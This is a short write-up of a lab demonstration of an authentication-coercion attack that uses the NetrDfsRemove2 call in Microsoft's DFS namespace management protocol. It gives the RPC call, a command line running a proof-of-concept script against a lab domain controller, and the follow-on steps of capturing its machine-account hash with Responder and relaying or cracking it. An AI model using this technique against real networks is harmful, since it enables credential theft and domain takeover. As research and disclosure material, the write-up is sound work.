# MS-DFSNM - Remote call to NetrDfsRemove2 (opnum 20)

## Summary

 - **Protocol**: [[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)

 - **Protocol UUID**: 4fc742e0-4a10-11cf-8273-00aa004ae673

 - **Protocol version**: 3.0

 - **SMB Named pipe**: ``

 - **Function name**: [`NetrDfsRemove2`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/5eefcdcb-411a-4bd0-995c-21b2c47a98fa)

 - **Function operation number**: `20`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-DFSNM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) protocol (with uuid `4fc742e0-4a10-11cf-8273-00aa004ae673` and version `3.0`) in order to perform remote procedure calls to functions in the [`MS-DFSNM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) and allows to call RPC functions of this protocol. We will then call the remote [`NetrDfsRemove2`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/5eefcdcb-411a-4bd0-995c-21b2c47a98fa) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
NetrDfsRemove2('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
NET_API_STATUS NetrDfsRemove2(
   [in, string] WCHAR* DfsEntryPath,
   [in, string] WCHAR* DcName,
   [in, unique, string] WCHAR* ServerName,
   [in, unique, string] WCHAR* ShareName,
   [in, out, unique] DFSM_ROOT_LIST** ppRootList
 );
```

## References

 - Documentation of protocol [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979

 - Documentation of function `NetrDfsRemove2`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/5eefcdcb-411a-4bd0-995c-21b2c47a98fa